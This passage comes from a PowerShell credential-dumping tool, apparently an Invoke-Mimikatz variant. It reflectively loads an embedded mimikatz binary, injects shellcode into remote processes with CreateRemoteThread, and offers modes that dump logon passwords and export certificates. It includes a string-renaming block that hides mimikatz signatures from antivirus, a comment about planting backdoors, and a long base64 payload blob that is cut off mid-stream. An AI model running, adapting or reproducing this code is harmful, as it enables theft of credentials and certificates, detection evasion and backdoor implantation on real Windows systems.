                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
                }
                else
                {
                    #Shellcode: CallDllMain.asm
                    $CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
                }
                $SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
                $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
                $SCPSMemOriginal = $SCPSMem

                Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)

                $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
                if ($RSCAddr -eq [IntPtr]::Zero)
                {
                    Throw "Unable to allocate memory in the remote process for shellcode"
                }

                $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
                if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
                {
                    Throw "Unable to write shellcode to remote process memory."
                }

                $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
                $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
                if ($Result -ne 0)
                {
                    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
                }

                $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            }
        }
        elseif ($PEInfo.FileType -ieq "EXE")
        {
            #Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
            [IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
            [System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
            $OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

            #If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
            #   This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
            [IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            Write-Verbose "Call EXE Main function. Address: $ExeMainPtr. Creating thread for the EXE to run in."
            # not here

            $Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

            while($true)
            {
                [Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
                if ($ThreadDone -eq 1)
                {
                    Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
                    Write-Verbose "EXE thread has completed."
                    break
                }
                else
                {
                    Start-Sleep -Seconds 1
                }
            }
        }

        return @($PEInfo.PEHandle, $EffectivePEHandle)
    }


    Function Invoke-MemoryFreeLibrary
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $PEHandle
        )

        #Get Win32 constants and functions
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types

        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants

        #Call FreeLibrary for all the imports of the DLL
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)

            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)

                #If the structure is null, it signals that this is the end of the array
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done unloading the libraries needed by the PE"
                    break
                }

                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
                $ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

                if ($ImportDllHandle -eq $null)
                {
                    Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
                }

                $Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
                if ($Success -eq $false)
                {
                    Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
                }

                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }

        #Call DllMain with process detach
        Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
        $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
        $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
        $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)

        $DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null


        $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
        if ($Success -eq $false)
        {
            Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
        }
    }


    Function Main
    {
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        $Win32Constants =  Get-Win32Constants

        $RemoteProcHandle = [IntPtr]::Zero

        #If a remote process to inject in to is specified, get a handle to it
        if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
        {
            Throw "Can't supply a ProcId and ProcName, choose one or the other"
        }
        elseif ($ProcName -ne $null -and $ProcName -ne "")
        {
            $Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
            if ($Processes.Count -eq 0)
            {
                Throw "Can't find process $ProcName"
            }
            elseif ($Processes.Count -gt 1)
            {
                $ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
                Write-Output $ProcInfo
                Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
            }
            else
            {
                $ProcId = $Processes[0].ID
            }
        }

        #Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
        #If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#       if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#       {
#           Write-Verbose "Getting SeDebugPrivilege"
#           Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#       }

        if (($ProcId -ne $null) -and ($ProcId -ne 0))
        {
            $RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
            if ($RemoteProcHandle -eq [IntPtr]::Zero)
            {
                Throw "Couldn't obtain the handle for process ID: $ProcId"
            }

            Write-Verbose "Got the handle for the remote process to inject in to"
        }


        #Load the PE reflectively
        Write-Verbose "Calling Invoke-MemoryLoadLibrary"

        try
        {
            $Processors = Get-WmiObject -Class Win32_Processor
        }
        catch
        {
            throw ($_.Exception)
        }

        if ($Processors -is [array])
        {
            $Processor = $Processors[0]
        } else {
            $Processor = $Processors
        }

        if ( ( $Processor.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
        {
            Write-Verbose ( "Architecture: " + $Processor.AddressWidth + " Process: " + ([System.IntPtr]::Size * 8))
            Write-Error "PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS." -ErrorAction Stop
        }

        #Determine whether or not to use 32bit or 64bit bytes
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)
        }
        else
        {
            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
        }

        #########
        ## ADD-ON:
        #########
        $hash = @{
            "mimikatz" = "yolokity"
            "gentilkiwi" = "miniorange"
            "lsadump" = "myadump"
            "dcshadow" = "dclights"
            "wdigest" = "gestwdi"
            "sekurlsa" = "sekelssa"
            "logonPasswords" = "Passlogonwords"
            "dpapisystem" = "apisystemdp"
            "dcsync" = "yncdcs"
            "netsync" = "synetnc"
            "minesweeper" = "weeminesper"
            "kerberos" = "eroskerb"
            "vault" = "ltvau"
            "sysenv" = "envsys"
            "busylight" = "zeebeedqa"
            "changentlm" = "ntlm4everr"
            "backupkeys" = "lostmykeys"
            "livessp" = "dsplive"
            "tspkg" = "aefxd"
            "mysmartlogon" = "delogonqmart"
            "pingcastle" = "xxxxxxxxxx"
            "benjamin" = "xxxxxxxx"
            "delpy" = "xxxxx"
            "le toux" = "xx xxxx"
            "letoux" = "xxxxxx"
        }
        $uni = [system.Text.Encoding]::Unicode
        $Encoder = [System.Text.Encoding]::GetEncoding(28591)
        $tmp = $Encoder.GetString($PEBytes)
        $hash.Keys | ForEach-Object {
            $tmp = $tmp -replace $Encoder.GetString($uni.GetBytes($_)), $Encoder.GetString($uni.GetBytes($hash.
            Item($_)))
        }
        $PEBytes = $Encoder.GetBytes($tmp)
        ### END ###

        $PEBytes[0] = 0
        $PEBytes[1] = 0
        $PEHandle = [IntPtr]::Zero
        if ($RemoteProcHandle -eq [IntPtr]::Zero)
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs
        }
        else
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle
        }
        if ($PELoadedInfo -eq [IntPtr]::Zero)
        {
            Throw "Unable to load PE, handle returned is NULL"
        }

        $PEHandle = $PELoadedInfo[0]
        $RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process


        #Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
        {
            #########################################
            ### YOUR CODE GOES HERE
            #########################################
                    Write-Verbose "Calling function with WString return type"
                    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "powershell_reflective_mimikatz"
                    if ($WStringFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $WStringFuncDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])
                    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
                    $WStringInput = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArgs)

                    #write-verbose "sleeping here"
                    #start-sleep -seconds 20

                    [IntPtr]$OutputPtr = $WStringFunc.Invoke($WStringInput)
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($WStringInput)
                    if ($OutputPtr -eq [IntPtr]::Zero)
                    {
                        Throw "Unable to get output, Output Ptr is NULL"
                    }
                    else
                    {
                        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
                        Write-Output $Output
                        $Win32Functions.LocalFree.Invoke($OutputPtr);
                    }
            #########################################
            ### END OF YOUR CODE
            #########################################
        }
        #For remote DLL injection, call a void function which takes no parameters
        elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
            if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
            {
                Throw "VoidFunc couldn't be found in the DLL"
            }

            $VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
            $VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle

            #Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
            $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
        }

        #Don't free a library if it is injected in a remote process
        if ($RemoteProcHandle -eq [IntPtr]::Zero)
        {
            Invoke-MemoryFreeLibrary -PEHandle $PEHandle
        }
        else
        {
            #Just delete the memory allocated in PowerShell to build the PE before injecting to remote process
            $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
            if ($Success -eq $false)
            {
                Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
            }
        }

        Write-Verbose "Done!"
    }

    Main
}

#Main function to either run the script locally or remotely
Function Main
{
    if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
    {
        $DebugPreference  = "Continue"
    }

    Write-Verbose "PowerShell ProcessID: $PID"


    if ($PsCmdlet.ParameterSetName -ieq "DumpCreds")
    {
        $ExeArgs = "sekurlsa::logonpasswords exit"
    }
    elseif ($PsCmdlet.ParameterSetName -ieq "DumpCerts")
    {
        $ExeArgs = "crypto::cng crypto::capi `"crypto::certificates /export`" `"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`" exit"
    }
    else
    {
        $ExeArgs = $Command
    }

    [System.IO.Directory]::SetCurrentDirectory($pwd)


    $PEBytes32 =
    if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, "Void", 0, "", $ExeArgs)
    }
    else
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, "Void", 0, "", $ExeArgs) -ComputerName $ComputerName
    }
}


$parts = $(whoami /user)[-1].split(" ")[1];
$parts2 = $parts.split('-');
$HostName = $([System.Net.Dns]::GetHostByName(($env:computerName)).HostName);
$DomainSID = $parts2[0..($parts2.Count-2)] -join '-';
$results = Main;
"Hostname: $HostName / $DomainSID";
$results
}
pMi+FJi9BIi89Ni/noJKf//0iL8EiFwHQ6SIXbdFIz7Tkrfi9MjXMQSYsWSIvO6GJf/P+FwHUSTIvGSI0VeCgLAEmLzOhoXvz//8VJg8YgOyt81UiF23QYTGMDSIvTScHgBUiLz0mDwDDoczj8/+sNujAAAABIi8/oiDf8/4B/YQBIi9B0PU2F/3QLSYvXSIvP6MMM//9Ii1QkYEiF0nQOQbgBAAAASIvP6GvkAABIhfZ0C0iL1kiLz+hDNfz/SIvT6zpIYwpIi0QkYEj/wUjB4QVIiQQRSGMCSMHgBUyJfBAYSGMCSMHgBUiJdBAQSGMCSMHgBUiDZBAoAP8CSItcJEBIi8JIi2wkSEiLdCRQSIt8JFhIg8QgQV9BXkFcw8zMSIXSD4SFAAAASIlcJAhIiWwkEEiJdCQYV0iD7CAz7UiL2kiL8TkqfkZIjXogSItX+EiF0nQISIvO6PoL//9IixdIhdJ0DkG4AQAAAEiLzuik4wAASItX8EiF0nQISIvO6Hs0/P//xUiDxyA7K3y+SIvTSIvO6GY0/P9Ii1wkMEiLbCQ4SIt0JEBIg8QgX8PMSIlcJAhIiWwkEEiJdCQYV0iD7DBIg7lAAQAAAEmL8IvqSIvZdDVJi9DoEjj8/0iL+EiFwA+EpAAAAEiLi1ABAABMi8hEi8VIi9P/k0ABAABIi9dIi8vo9TP8/0iDu0gBAAAAdHlIi8voF+P9/0iL+EiFwHRhSINkJCAAQbEBQYPI/0iL1kiLyOj/3v3/D7dPCLgCAgAAZiPIsgJmO8h1CzhXCnUGSItHEOsO9kcIAXUlSIvP6Bvi/f9IhcB0GEQPtkNeTIvISIuLUAEAAEiL0/+TSAEAAEiLz+j25v3/SItcJEBIi2wkSEiLdCRQSIPEMF/DzEiJXCQISIlsJBBIiXQkGFdBVkFXSIPsIEyLMUmL6UmL2ECK+kiL8U2FwHUWRTPJTIvFSYvO6K4BAABIi9hIhcB0B0iDexgAdSNAD7bXTIvFSYvO6LT+//9FM8lMi8VAitdJi87ofwEAAEiL2EiF23RaSIN7GAB1TkyLOzP/SI0FbEQJAEUzyYoUB02Lx0mLzuhTAQAASIN4GAB1DUj/x0iD/wN82DPb6x0PEAAPEQMPEEgQDxFLEPIPEEAg8g8RQyBIg2MgAEiF23UZTIvFSI0VXyULAEiLzugvW/z/x0YYAQEAAEiLbCRISIvDSItcJEBIi3QkUEiDxCBBX0FeX8NIi8RIiVgISIloEEiJcBhIiXggQVZIg+wgTI2xAAIAAEGL6EiL+UUzwEmLzkiL8ujsbfz/SItYEEiF2w+FiQAAAIXtD4SBAAAASIX2dQQzwOsSSIPI/0j/wIA8BgB19yX///8/SI1oAUiLz0iNVXjo7DP8/0iL2EiFwHROSI1IeMZACAFMi8VIiQhIi9ZIiUgoSIlIUMZAMALGQFgD6GrHBgBIixNMi8NJi87oDG78/0yLwEiFwHQSSIvP6Nw2/P9Ji9DolDH8/zPbSItsJDhIi8NIi1wkMEiLdCRASIt8JEhIg8QgQV7DQFNIg+wgSYvAitpNhcB0EEWLwUiL0Oj9/v//TIvA6wRMi0EQTYXAdA8PtsNIjQyATY0EyEmDwNhJi8BIg8QgW8PMzMxFishIi8GD+v51DUiLQRhI99gbwIPgBsNED74BRDvCdAiAOQB8AzPAw0Q7wrkEAAAARItABEGLwEEPttFEjVH9QQ9FyoPgAzvQdQWDwQLrCkEj0PbCAnQC/8GLwcPMzMyF0g+O0gAAAEiJXCQISIlsJBBIiXQkGFdBVkFXSIPsIEiL+YvqSI1ZEEyNPaDCDwBIi3MoSIX2dQQzwOsSSIPI/0j/wIA8BgB19yX///8/D74OA8i4yUIWsvfpA9HB+gSLwsHoHwPQa8IXK8hMY/FPixz36xRJi0s4SIvW6ONZ/P+FwHQJTYtbQE2F23XnTYXbdA1Ji0MQSIkDSYl7EOsQSIMjAEuLBPdIiUMwS4k890iDx0hIg8NISIPtAQ+Fbv///0iLXCRASItsJEhIi3QkUEiDxCBBX0FeX8PMSIvESIlYCEiJaBBIiXAgRIlAGFdBVEFVQVZBV0iD7CAz20Uz9kWK6UWL+EiL6kiL8UiF0nUEM//rEkiDz/9I/8c4HBd1+IHn////P0yNoegBAABFM8BJi8zoWmv8/0yLWBDrKEWKxUGL10mLy+hS/v//QTvGSYvLTYtbEIvQQQ9O1kgPTstIi9lEi/JNhdt100SKfCRwRYT/D4WXAAAASIXbdAr2RiwCD4Q+AQAAD7ZFAEyNBXvW+v8z9kIPtowAELIOALjJQhayA8/34cHqBGvCFyvISGPBTYucwMDqFADrFEmLSzhIi9Xomlj8/4XAdAlNi1tATYXbdedNhdsPhOgAAABEi3QkYEWKxUGL1kmLy+it/f//O8ZJi8tNi1sQSA9Oyw9OxkiL2YvwTYXbddjptgAAAEGD/gYPjawAAACL10iLzkiDwknoqjD8/0iL2EiFwHRzRIt0JGBIjUhISIlIOEiL1USIMEEPtsWJQwSNRwFEi8DoKcQGAEiLUziKAoTAdCFMjQWo1fr/D7bAQoqEABCyDgCIAkj/wooChMB16kiLUzhMi8NJi8zoo2r8/0g7w3UySIvTSIvO6DMu/P9Ii87oazP8/zPASItcJFBIi2wkWEiLdCRoSIPEIEFfQV5BXUFcX8NIiUMQSIXbdNhIg3sYAHUFRYT/dMxIi8PryczMSIvESIlYCFdIg+xgDxBBCEiL2fIPEEkYDxFAyA8QQTjyDxFI2A8RQLgPEUDg8g8QQUhIg2FAAINhPACDYTgASINhSABIg8Eg8g8RQPDosmf8/w8QRCQgZg9z2AhmSA9+x+sOSItXEDPJ6KpsAQBIiz9Ihf917UiNTCRI6IRn/P9IIXsQIXsMIXsISCF7GEiLfCQ46xlIi1cQSIXSdA2DQjz/dQczyegxnP//SIs/SIX/deJIjUwkMOhHZ/z/SI1LUOg+Z/z/D7dDckghe2ioAXQD/0MEufb/AABmI8FmiUNySItcJHBIg8RgX8NIiVwkCEiJdCQQV0iD7CAz9kiL+UiF0nQsSItaCEyLQ0BNhcB1PY1WeDPJ6Ngu/P9IiUNASI0F2f7//0yLQ0BIiUNI6w+6eAAAADPJ6Lcu/P9Mi8BNhcB1CkiLz+jjMfz/6ztBOHBwdTVJiXAQSYlwCEmJcBhJiXAoSYlwIEmJcDBJiXBASYlwOEmJcEhJiXBYSYlwUEmJcGBBxkBxAUiLXCQwSYvASIt0JDhIg8QgX8PMzMxIiVwkCEiJbCQQSIl0JBhXSIPsIEiNeghIi/FMi8cz0ui7lv//SItXIDPtSIsOSIvYSIXSdBlIhcl0CUg5qZgCAAB1BoNCPP91Bejtmv//SIlfIEiF23QD/0M8SIvXSIvO6MIrAQBIi3QkQIXASA9F3UiLbCQ4SIvDSItcJDBIg8QgX8NIg+woRTPSTIvJRDlSVHQtSItCYEiFwHQRSIsJSDkIdAlIi0AoSIXAdfJIi0AISIsIQYvCTDlRaA+UwOta90JAAQQAAHQe9kJAAUiLCUiLQTB0KCUBAAAQSIP4AXQGRThRHnQ3RYXAdUtMOVIYdEVMiwJIjRVrHgsA6ypID7rgHHMSTDmR0AEAAHUJRDmR1AAAAHQHQYvChcB0yUyLAkiNFR8eCwBJi8noz1P8/7gBAAAA6wIzwEiDxCjDzEiLxEiJWAhIiWgQSIlwGEiJeCBBVEFWQVdIg+xwTItScE2L4UiLGU2L2EyL+kyL8b/AvfD/TYXSdBdIi0MgM/9Ig8AY6wb/x0iNQCBMORB19U2F23QWRTPJRTPASYvTSIvL6GX1/v9Ii+jrAjPtRTPJRTPAM9JJi87o0uX//0iL8EiFwHQqSYsXSIvL6G8u/P9IiUYYSItTIEhjz0jB4QVIixQRSIvL6FQu/P9IiUYQSIuEJLAAAABMi81IiUQkQEyLxsdEJDgAAAIAM9JMiWQkMEmLzkiDZCQoAEiDZCQgAOhO2gAAi5QkuAAAAEyNRCRQSINkJGAASYvOg2QkWABIi/iDZCRcAIlUJFRIi9DGRCRQDOj3PwEASIX/dBFBuAEAAABIi9dIi8vo+dgAAEyNXCRwSYtbIEmLayhJi3MwSYt7OEmL40FfQV5BXMPMzEiLxEyJSCBMiUAYSIlQEEiJSAhVU1ZXQVRBVUFWQVdIjWiYSIHsKAEAAEyLKUUz5DPARIlkJGBBi9xJi/hIi/FIiVwkcESJZZBEiWWYRIlkJGhEiWWERIlljESJZZREiWWIRIllqEiJRCR4SIlFyEyJbaBEOWEwD4WOCAAARThlYQ+FhAgAAOjk/P//TIv4SIXAD4RqCAAARTPJTIlkJCBFjUQkfEiL0EiLzugUbAEATYt3GEyL4EyJdbiNewFIiUXgSIXAdRdFM8lFM8BJi9dIi87obEoAAIXAdQIz/0mL10iLzuiLvP//hcAPhQoIAABFM8BJi9dNheRIi85BD5XA6O78//9FM+SFwA+F6gcAAEmLT3C7wL3w/0iFyXQgSYtFIEGL3EiDwBhIOQh0EEGNVCQBA9pIjUAgSDkIdfVJi0UgRTPJTYsHSGPLSMHhBUGNUQlIiwwBSIlMJCBIi87oT4z//0G4AQAAAEE7wA+EhAcAAESLZjQz0kiLRXhEiWQkZIlVgESJYExEAUY0SYtHEItONEiFwHQVQQPIQQPQiU40SItAKEiFwHXuiVWATYX2dBpIi4ZIAQAASIlEJHhJiwdIiYZIAQAASIl1yEiLzuh6/gAATIvwSIXAD4TJAgAAgH4eAHUHg4jIAAAAIESLw4vXSIvO6LDq//9Ig324AEiLnYAAAAB0JUSJZCQoRTPJSINkJCAATIvDSYvXSIvO6Ir8//9EiWWQRIlkJGAz0kiNTehEjUI46GK0BgBIi0V4SIlF8EiJdehIhdt0FEiL00iNTejo7d/+/4XAD4VIAgAAQfZFMIB0NYB+HgB1L0iDvpgAAAAAdSWDZCQgALoBAAAAAVY4RTPAi0Y4SYvORIvIiUWYQY1QRujh3v3/9kUQQLgBAAAAD0X499+NSAFmG9tmgeP4/2aBwxwEQfZHQCB1KwFGOI1RR0Uz7WaJhZAAAACLRjhFM8BEIWwkIESLyEmLzolFjOiT3v3/62ZNi28Q6w5Bi0VkJAM6wXQJTYttKE2F7XXtQQ+/fV66cAAAAItGOESLz4NkJCAAZom9kAAAAI1IAQPHiUwkaItONESLwYlGOIlNhI1BAUmLzolGNOg53v3/SYvViUWoSIvO6Nvn/f9Ii72AAAAAQY1EJAFIi1V4RTPkiUQkMEUzyWaJXCQoTIvHSIvOTIlkJCDoiCwCAEiJRbBIhcAPhF4FAABAinhFQY1UJAFIi1gsSIld2EiJXcBAiL2IAAAAQDr6dBRIi4aQAAAASIvOSIXASA9FyIhRIItFmIXAdB1Ei8pEiWQkILpTAAAARIvASYvO6Jvd/f+6AQAAAE2F7XRYSA+/hZAAAABIhcB+RIt8JGhIi/CLXCRkSYtFCESLw0mL14l8JCBJi85GD78MYOiuGv//ugEAAAAD+kwD4kw75nzWSItd2EiLdXBAir2IAAAARItkJGjrJQFWOEGDyf9Ei2Y4SYvXRItEJGRJi85EiWQkIOhpGv//ugEAAABAhP8PhJoAAAAPt4WQAAAASItNoIlFcItFgIPAAkhj0OijJ/z/SIlEJHBIi8hIhcB1F0iLTbDoaTcCAEyLbaBIi1wkcOlGBAAAi0WAugEAAAD/wExjwOjZsQYASGNNgEiLVCRwxkQRAQCLTCRkhdt4CSvZSGPDxgQQAItFxIXAeAgrwUiYxgQQAItFqIXAD4SMAQAAi9BJi87oUuT9/+l9AQAATYXtD4RXAQAAAVY4SYvVSIsORItmOINlcADovk4AAA+/vZAAAAC6XAAAAESLRCRoRIvPSYvORIlkJCBIi9joLtz9/0SLz0yLw4vQSYvO6A7l/f+LRCRoRYvMRItFhLqEAAAASYvOiXwkKIlEJCDoDt/9/0CKvYgAAABIi02w6H42AgBIg324AHV/M9uNUwJAOvp1FyFcJCCNUxFFM8lFM8BJi87oyNv9/4vYQYN/VAB1OUiNRZBBsQhIiUQkOEG4YgAAAEiNRCRgSYvXSIlEJDBIi85Ii0QkcEiJRCQoi0QkZIlEJCDoUngAALgCAAAAQDr4dRSL00mLzuhO5f3/QYuOkAAAAIlICECE/w+EggAAAEGDf1QAi1QkYItdcA+F7AAAAEiLTCRwi8IrRCRkSJiAPAgAD4TKAAAARItNlESLwg+/w7ocAAAAiUQkKEmLzkSJZCQg6Cbe/f/poQAAAINkJCAARYvMRItFjEmLzmaJVXC6kwAAAOj02v3/QIT/D4T0/v///05Ei0ZEiUWU6e/+//9FM8lJi85Nhe10SUSLRYRBjVEkRCFMJCDowNr9/0GLV1SLyvfZiUWISYvORRvARTPJRSPEhdJEiUQkIESLRYRFD0TM99ob0oPi24PCf+iL2v3/6xZEi0WMuikAAABEiWQkIOh22v3/iUWIi11wi1QkYEGDf1QAD4S9AAAASYtfYEiF23QSSItFoEg5A3QJSItbKEiF23XySYvXSIvO6LunAQBIi4aQAAAARTP/SIXASIvOSA9FyEGNRwGIQSFAOvh1JUSLRCRkjVB0RTPJRIl8JCBJi87oA9r9/0w5vpAAAAB1BESIfiBBvwEAAABEiWQkIEWLz0UzwEmLzkGNVwno2dn9/0WNT/NMi8OL0EmLzui44v3/SWOGkAAAAEUz5IXAfl1IjQxASYuGiAAAAEGNVwFmiVTI6utHgH4eAESLyotNxEmL10yLReAPlMCJTCR